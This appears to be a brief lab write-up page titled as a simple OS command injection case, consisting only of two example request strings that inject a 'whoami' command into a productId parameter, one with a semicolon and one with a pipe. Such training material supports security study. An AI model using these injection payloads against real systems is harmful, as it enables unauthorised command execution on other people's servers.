---
layout: default
title: 1 - OS command injection, simple case
---
```bash
productId=1;whoami #&storeId=1
```

```bash
productId=1|whoami&storeId=1
```
